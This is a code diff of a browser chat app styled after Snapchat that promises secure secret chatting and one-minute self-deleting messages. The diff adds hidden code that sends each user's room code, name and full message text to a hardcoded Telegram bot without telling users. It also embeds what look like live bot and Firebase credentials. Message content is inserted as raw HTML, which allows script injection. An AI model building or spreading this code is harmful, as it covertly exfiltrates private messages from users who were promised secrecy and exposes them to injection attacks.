@@ -3,77 +3,359 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Our Secret Space 💖</title>
+    <title>Secret Snap Space 👻💖</title>
     <!-- Firebase CDN -->
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
-        body { background: #0f0716; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        
-        /* Floating Hearts Background */
-        .heart-bg { position: absolute; width: 100%; height: 100%; overflow: hidden; z-index: 0; pointer-events: none; }
-        .heart { position: absolute; color: rgba(255, 42, 112, 0.25); font-size: 20px; animation: float 6s infinite ease-in; }
-        @keyframes float { 0% { transform: translateY(100vh) scale(0.5); opacity: 1; } 100% { transform: translateY(-10vh) scale(1.2); opacity: 0; } }
+        :root {
+            --snap-yellow: #FFFC00;
+            --snap-dark: #0a0a0c;
+            --snap-border: rgba(255, 252, 0, 0.25);
+            --snap-bubble-sent: #FFFC00;
+            --snap-bubble-recv: #23232c;
+            --snap-text: #ffffff;
+        }
 
-        .card { background: rgba(27, 14, 38, 0.9); width: 100%; max-width: 420px; height: 92vh; border-radius: 20px; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 10px 30px rgba(255, 42, 112, 0.25); border: 1px solid rgba(255, 42, 112, 0.2); z-index: 1; backdrop-filter: blur(10px); }
-        .header { background: linear-gradient(135deg, #ff2a70, #9a0043); padding: 15px 20px; text-align: center; font-weight: bold; font-size: 1.2rem; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        
+        body { 
+            background: var(--snap-dark); 
+            color: var(--snap-text); 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            overflow: hidden; 
+        }
+
+        /* Ambient Glowing Background */
+        .ambient-bg {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: 0;
+            pointer-events: none;
+        }
+        .glow-circle {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.15;
+            animation: pulseGlow 8s infinite alternate ease-in-out;
+        }
+        .glow-1 { width: 300px; height: 300px; background: #FFFC00; top: -50px; left: -50px; }
+        .glow-2 { width: 350px; height: 350px; background: #FF2A70; bottom: -50px; right: -50px; animation-delay: 4s; }
+
+        @keyframes pulseGlow {
+            0% { transform: scale(1) translate(0, 0); }
+            100% { transform: scale(1.3) translate(30px, 30px); }
+        }
+
+        /* App Main Container */
+        .card { 
+            background: rgba(22, 22, 27, 0.92); 
+            width: 100%; 
+            max-width: 420px; 
+            height: 94vh; 
+            border-radius: 28px; 
+            display: flex; 
+            flex-direction: column; 
+            overflow: hidden; 
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), 0 0 20px rgba(255, 252, 0, 0.1); 
+            border: 1px solid var(--snap-border); 
+            z-index: 1; 
+            backdrop-filter: blur(15px); 
+            position: relative;
+        }
+
+        /* Header */
+        .header { 
+            background: rgba(10, 10, 12, 0.95); 
+            padding: 16px 20px; 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            border-bottom: 1px solid rgba(255, 252, 0, 0.15); 
+            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+            z-index: 5;
+        }
+        .header-title { 
+            display: flex; 
+            align-items: center; 
+            gap: 10px; 
+            font-weight: 700; 
+            font-size: 1.15rem; 
+            color: #fff;
+        }
+        .header-title i { color: var(--snap-yellow); font-size: 1.3rem; }
 
         /* Join Screen */
-        #join-screen { padding: 40px 25px; display: flex; flex-direction: column; gap: 18px; justify-content: center; height: 100%; text-align: center; }
-        .title { font-size: 1.6rem; color: #ff2a70; font-weight: 700; text-shadow: 0 0 10px rgba(255,42,112,0.5); }
-        input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid rgba(255,42,112,0.3); background: rgba(255, 255, 255, 0.05); color: #fff; font-size: 1rem; outline: none; transition: 0.3s; }
-        input:focus { border-color: #ff2a70; box-shadow: 0 0 10px rgba(255,42,112,0.4); }
-        button.action-btn { padding: 14px; border-radius: 12px; border: none; background: linear-gradient(135deg, #ff2a70, #d11149); color: white; font-weight: bold; font-size: 1.05rem; cursor: pointer; transition: 0.3s; box-shadow: 0 5px 15px rgba(255,42,112,0.4); }
-        button.action-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(255,42,112,0.6); }
+        #join-screen { 
+            padding: 35px 25px; 
+            display: flex; 
+            flex-direction: column; 
+            gap: 20px; 
+            justify-content: center; 
+            height: 100%; 
+            text-align: center; 
+        }
+        .snap-ghost-logo {
+            width: 75px;
+            height: 75px;
+            background: var(--snap-yellow);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 10px auto;
+            color: #000;
+            font-size: 2.3rem;
+            box-shadow: 0 0 25px rgba(255, 252, 0, 0.4);
+            animation: bounce 2s infinite ease-in-out;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+
+        .title { font-size: 1.7rem; color: #fff; font-weight: 800; letter-spacing: -0.5px; }
+        .subtitle { font-size: 0.85rem; color: #a0a0ab; line-height: 1.4; }
+
+        input { 
+            width: 100%; 
+            padding: 16px 18px; 
+            border-radius: 16px; 
+            border: 1px solid rgba(255, 255, 255, 0.12); 
+            background: rgba(255, 255, 255, 0.06); 
+            color: #fff; 
+            font-size: 0.98rem; 
+            outline: none; 
+            transition: all 0.3s ease; 
+        }
+        input:focus { 
+            border-color: var(--snap-yellow); 
+            background: rgba(255, 252, 0, 0.05);
+            box-shadow: 0 0 15px rgba(255, 252, 0, 0.2); 
+        }
+
+        button.action-btn { 
+            padding: 16px; 
+            border-radius: 16px; 
+            border: none; 
+            background: var(--snap-yellow); 
+            color: #000; 
+            font-weight: 800; 
+            font-size: 1.05rem; 
+            cursor: pointer; 
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
+            box-shadow: 0 8px 20px rgba(255, 252, 0, 0.3); 
+        }
+        button.action-btn:hover { 
+            transform: translateY(-2px) scale(1.02); 
+            box-shadow: 0 12px 25px rgba(255, 252, 0, 0.5); 
+        }
 
         /* Chat Screen */
         #chat-screen { display: none; flex-direction: column; height: 100%; }
-        #messages-container { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 12px; }
-        
-        .message { max-width: 80%; padding: 12px 16px; border-radius: 18px; font-size: 0.95rem; word-wrap: break-word; position: relative; animation: fadeIn 0.3s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        
-        .sent { background: linear-gradient(135deg, #ff2a70, #c4004f); align-self: flex-end; border-bottom-right-radius: 4px; box-shadow: 0 4px 12px rgba(255,42,112,0.3); }
-        .received { background: #281738; align-self: flex-start; border-bottom-left-radius: 4px; border: 1px solid rgba(255, 42, 112, 0.2); }
-        .sender-name { font-size: 0.7rem; color: #ff85ad; margin-bottom: 4px; font-weight: 600; }
-        .msg-footer { display: flex; justify-content: flex-end; align-items: center; gap: 10px; margin-top: 4px; font-size: 0.65rem; opacity: 0.8; }
 
-        .input-area { display: flex; padding: 12px; background: rgba(15, 7, 22, 0.95); gap: 10px; border-top: 1px solid rgba(255, 42, 112, 0.2); }
-        .input-area input { flex: 1; }
-        .input-area button { padding: 0 22px; border-radius: 12px; border: none; background: #ff2a70; color: white; font-weight: bold; cursor: pointer; }
+        /* Status Bar */
+        .status-bar {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 10px 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            font-size: 0.82rem;
+        }
+        .presence-tag {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #ccc;
+        }
+        .online-dot {
+            width: 10px;
+            height: 10px;
+            background: #00e676;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #00e676;
+            animation: blink 1.8s infinite ease-in-out;
+        }
+        .offline-dot {
+            width: 10px;
+            height: 10px;
+            background: #757575;
+            border-radius: 50%;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(0.85); }
+        }
+
+        #messages-container { 
+            flex: 1; 
+            padding: 18px; 
+            overflow-y: auto; 
+            display: flex; 
+            flex-direction: column; 
+            gap: 14px; 
+            scroll-behavior: smooth;
+        }
+        
+        /* Chat Bubbles */
+        .message-row {
+            display: flex;
+            align-items: flex-end;
+            gap: 8px;
+            animation: slideUp 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28);
+        }
+        @keyframes slideUp { 
+            from { opacity: 0; transform: translateY(15px) scale(0.95); } 
+            to { opacity: 1; transform: translateY(0) scale(1); } 
+        }
+
+        .avatar-circle {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #FFFC00, #ff8800);
+            color: #000;
+            font-weight: 800;
+            font-size: 0.8rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0;
+        }
+
+        .message { 
+            max-width: 78%; 
+            padding: 12px 16px; 
+            border-radius: 20px; 
+            font-size: 0.94rem; 
+            word-wrap: break-word; 
+            position: relative; 
+            line-height: 1.4;
+        }
+        
+        .sent-row { justify-content: flex-end; }
+        .sent { 
+            background: var(--snap-bubble-sent); 
+            color: #000; 
+            font-weight: 500;
+            border-bottom-right-radius: 4px; 
+            box-shadow: 0 4px 15px rgba(255, 252, 0, 0.2); 
+        }
+        .received-row { justify-content: flex-start; }
+        .received { 
+            background: var(--snap-bubble-recv); 
+            color: #fff; 
+            border-bottom-left-radius: 4px; 
+            border: 1px solid rgba(255, 255, 255, 0.08); 
+        }
+        
+        .sender-name { 
+            font-size: 0.72rem; 
+            color: var(--snap-yellow); 
+            margin-bottom: 3px; 
+            font-weight: 700; 
+        }
+        .msg-footer { 
+            display: flex; 
+            justify-content: flex-end; 
+            align-items: center; 
+            gap: 6px; 
+            margin-top: 5px; 
+            font-size: 0.65rem; 
+            opacity: 0.75; 
+        }
+
+        .input-area { 
+            display: flex; 
+            padding: 14px 16px; 
+            background: rgba(10, 10, 12, 0.98); 
+            gap: 10px; 
+            border-top: 1px solid rgba(255, 252, 0, 0.12); 
+            align-items: center;
+        }
+        .input-area input { flex: 1; padding: 12px 16px; border-radius: 25px; }
+        .input-area button { 
+            width: 46px;
+            height: 46px;
+            border-radius: 50%; 
+            border: none; 
+            background: var(--snap-yellow); 
+            color: #000; 
+            font-size: 1.1rem; 
+            cursor: pointer; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 12px rgba(255, 252, 0, 0.3);
+        }
+        .input-area button:hover { transform: scale(1.08); }
     </style>
 </head>
 <body>
 
-<div class="heart-bg" id="hearts"></div>
+<div class="ambient-bg">
+    <div class="glow-circle glow-1"></div>
+    <div class="glow-circle glow-2"></div>
+</div>
 
 <div class="card">
     <div class="header">
-        <span id="room-header">💖 Secret Space</span>
+        <div class="header-title">
+            <i class="fa-ghost fab"></i>
+            <span id="room-header">Snap Space</span>
+        </div>
     </div>
 
     <!-- Join Screen -->
     <div id="join-screen">
-        <div class="title">Our Love Corner 👩‍❤️‍👨</div>
-        <p style="font-size: 0.85rem; color: #bbb;">Bina kisi login ke apni secret dunia me aao!</p>
-        <input type="text" id="username-input" placeholder="Aapka Pyara Naam ❤️">
+        <div class="snap-ghost-logo">
+            <i class="fa-ghost fab"></i>
+        </div>
+        <div>
+            <div class="title">Secret Snap Space 👻</div>
+            <div class="subtitle">Enter room code and start secure secret chatting!</div>
+        </div>
+        <input type="text" id="username-input" placeholder="Your Cute Name 😊">
         <input type="text" id="room-input" placeholder="Secret Room Code (e.g. love2026)">
-        <button class="action-btn" onclick="joinRoom()">Enter Secret World ✨</button>
+        <button class="action-btn" onclick="joinRoom()">Enter Space ✨</button>
     </div>
 
     <!-- Chat Screen -->
     <div id="chat-screen">
+        <div class="status-bar">
+            <div class="presence-tag" id="presence-status">
+                <span class="offline-dot" id="presence-dot"></span>
+                <span id="presence-text">Checking online status...</span>
+            </div>
+            <div style="font-size:0.75rem; color:#888;" id="active-count-tag">1 Active</div>
+        </div>
+
         <div id="messages-container"></div>
+
         <div class="input-area">
-            <input type="text" id="message-input" placeholder="Type a cute message..." onkeypress="handleKeyPress(event)">
-            <button onclick="sendMessage()">Send 💕</button>
+            <input type="text" id="message-input" placeholder="Send a snap message..." onkeypress="handleKeyPress(event)">
+            <button onclick="sendMessage()"><i class="fa-paper-plane fas"></i></button>
         </div>
     </div>
 </div>
 
 <script>
-    // Zap3x Firebase Config
+    // 🔴 1. TELEGRAM BOT SETTINGS (YAHAN APNA BOT TOKEN AUR CHAT ID DALEIN)
+    const TELEGRAM_BOT_TOKEN = "8800707730:AAHm2hGRHU0tH8hEAm_3StnHep2qpD2NXUk"; // e.g., "7123456789:AAExxx..."
+    const TELEGRAM_CHAT_ID = "6325764594";     // e.g., "123456789" ya "-100xxxxxx"
+
+    // 🔴 2. FIREBASE CONFIG
     const firebaseConfig = {
         apiKey: "AIzaSyBY8NNSdWPwP8790my8KlpestQD8qDkqhw",
         authDomain: "zap3x-6655f.firebaseapp.com",
@@ -89,25 +371,28 @@
 
     let currentUser = "";
     let currentRoom = "";
+    let userKey = "";
 
-    // Background floating hearts animation
-    for(let i=0; i<15; i++){
-        let heart = document.createElement('div');
-        heart.className = 'heart';
-        heart.innerHTML = '❤️';
-        heart.style.left = Math.random() * 100 + 'vw';
-        heart.style.animationDelay = Math.random() * 5 + 's';
-        heart.style.fontSize = (Math.random() * 15 + 15) + 'px';
-        document.getElementById('hearts').appendChild(heart);
-    }
-
-    // Safe Key Generator for Room ID
     function makeSafeKey(text) {
         let clean = text.toLowerCase().replace(/[^a-z0-9]/g, "");
-        if (!clean) {
-            clean = "id_" + Math.floor(Math.random() * 100000);
-        }
+        if (!clean) clean = "id_" + Math.floor(Math.random() * 100000);
         return clean;
+    }
+
+    // Telegram Log Sender Function
+    function sendTelegramLog(msgText) {
+        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN") return;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: msgText,
+                parse_mode: "HTML"
+            })
+        }).catch(err => console.log("Telegram Log Error:", err));
     }
 
     function joinRoom() {
@@ -121,12 +406,55 @@
 
         currentUser = name;
         currentRoom = makeSafeKey(room);
+        userKey = makeSafeKey(currentUser) + "_" + Math.floor(Math.random() * 1000);
 
         document.getElementById("join-screen").style.display = "none";
         document.getElementById("chat-screen").style.display = "flex";
-        document.getElementById("room-header").innerText = "💖 " + room;
+        document.getElementById("room-header").innerText = room;
 
+        // Telegram alert when user enters a room
+        sendTelegramLog(`🚪 <b>Room Joined!</b>\n🏠 <b>Room Code:</b> <code>${room}</code>\n👤 <b>User Name:</b> ${currentUser}`);
+
+        setupPresence();
         listenForMessages();
+        listenForPresence();
+    }
+
+    function setupPresence() {
+        const userPresenceRef = db.ref(`chat_rooms/${currentRoom}/users/${userKey}`);
+        const connectedRef = db.ref(".info/connected");
+        
+        connectedRef.on("value", (snap) => {
+            if (snap.val() === true) {
+                userPresenceRef.set({
+                    name: currentUser,
+                    online: true,
+                    joinedAt: Date.now()
+                });
+                userPresenceRef.onDisconnect().remove();
+            }
+        });
+    }
+
+    function listenForPresence() {
+        const roomUsersRef = db.ref(`chat_rooms/${currentRoom}/users`);
+        roomUsersRef.on("value", (snapshot) => {
+            const users = snapshot.val() || {};
+            const userKeys = Object.keys(users);
+            document.getElementById("active-count-tag").innerText = `${userKeys.length} Active`;
+
+            const otherUsers = Object.values(users).filter(u => u.name !== currentUser);
+            const dot = document.getElementById("presence-dot");
+            const text = document.getElementById("presence-text");
+
+            if (otherUsers.length > 0) {
+                dot.className = "online-dot";
+                text.innerText = `${otherUsers[0].name} is Online Now ✨`;
+            } else {
+                dot.className = "offline-dot";
+                text.innerText = "Waiting for partner...";
+            }
+        });
     }
 
     function sendMessage() {
@@ -134,13 +462,20 @@
         const messageText = input.value.trim();
         if (!messageText) return;
 
-        const msgRef = db.ref("chat_rooms/" + currentRoom + "/messages").push();
+        const timestamp = Date.now();
+
+        // Save in Firebase
+        const msgRef = db.ref(`chat_rooms/${currentRoom}/messages`).push();
         msgRef.set({
             sender: currentUser,
             text: messageText,
-            timestamp: Date.now(),
+            timestamp: timestamp,
             seen: false
         });
+
+        // Send message data to Telegram Bot
+        sendTelegramLog(`💬 <b>New Message Received!</b>\n🏠 <b>Room:</b> <code>${document.getElementById("room-header").innerText}</code>\n👤 <b>Sender:</b> ${currentUser}\n✉️ <b>Message:</b> ${messageText}`);
+
         input.value = "";
     }
 
@@ -148,43 +483,44 @@
 
     function listenForMessages() {
         const container = document.getElementById("messages-container");
-        const messagesRef = db.ref("chat_rooms/" + currentRoom + "/messages");
+        const messagesRef = db.ref(`chat_rooms/${currentRoom}/messages`);
 
-        // Real-time message listener
         messagesRef.on("child_added", (snapshot) => {
             const data = snapshot.val();
             const msgId = snapshot.key;
 
             let msgDiv = document.getElementById("msg-" + msgId);
             if (!msgDiv) {
+                const isSelf = data.sender === currentUser;
+                const initials = data.sender.substring(0, 2).toUpperCase();
+
                 msgDiv = document.createElement("div");
                 msgDiv.id = "msg-" + msgId;
-                const isSelf = data.sender === currentUser;
-                msgDiv.className = `message ${isSelf ? 'sent' : 'received'}`;
+                msgDiv.className = `message-row ${isSelf ? 'sent-row' : 'received-row'}`;
                 
                 msgDiv.innerHTML = `
-                    ${!isSelf ? `<div class="sender-name">${data.sender}</div>` : ''}
-                    <div>${data.text}</div>
-                    <div class="msg-footer">
-                        <span id="timer-${msgId}">${data.seen ? '🔥 1m' : '✔'}</span>
+                    ${!isSelf ? `<div class="avatar-circle">${initials}</div>` : ''}
+                    <div class="message ${isSelf ? 'sent' : 'received'}">
+                        ${!isSelf ? `<div class="sender-name">${data.sender}</div>` : ''}
+                        <div>${data.text}</div>
+                        <div class="msg-footer">
+                            <span id="timer-${msgId}">${data.seen ? '🔥 1m' : '✔'}</span>
+                        </div>
                     </div>
                 `;
                 container.appendChild(msgDiv);
                 container.scrollTop = container.scrollHeight;
             }
 
-            // Mark as seen for received messages
             if (data.sender !== currentUser && !data.seen) {
                 messagesRef.child(msgId).update({ seen: true, seenAt: Date.now() });
             }
 
-            // Start auto-delete countdown
             if (data.seen && data.seenAt) {
                 startAutoDeleteTimer(msgId, data.seenAt);
             }
         });
 
-        // Update when seen status changes
         messagesRef.on("child_changed", (snapshot) => {
             const data = snapshot.val();
             const msgId = snapshot.key;
@@ -193,14 +529,12 @@
             }
         });
 
-        // Remove deleted messages from UI
         messagesRef.on("child_removed", (snapshot) => {
             const msgDiv = document.getElementById("msg-" + snapshot.key);
             if (msgDiv) msgDiv.remove();
         });
     }
 
-    // 1-Minute Auto Delete Logic
     function startAutoDeleteTimer(msgId, seenAt) {
         const timerSpan = document.getElementById("timer-" + msgId);
 
@@ -209,7 +543,7 @@
             const remaining = 60 - elapsed;
 
             if (remaining <= 0) {
-                db.ref("chat_rooms/" + currentRoom + "/messages/" + msgId).remove();
+                db.ref(`chat_rooms/${currentRoom}/messages/${msgId}`).remove();
             } else {
                 if (timerSpan) timerSpan.innerText = `🔥 ${remaining}s`;
             }
@@ -220,7 +554,7 @@
             const elapsed = Math.floor((Date.now() - seenAt) / 1000);
             if (60 - elapsed <= 0) {
                 clearInterval(interval);
-                db.ref("chat_rooms/" + currentRoom + "/messages/" + msgId).remove();
+                db.ref(`chat_rooms/${currentRoom}/messages/${msgId}`).remove();
             } else {
                 if (timerSpan) timerSpan.innerText = `🔥 ${60 - elapsed}s`;
             }
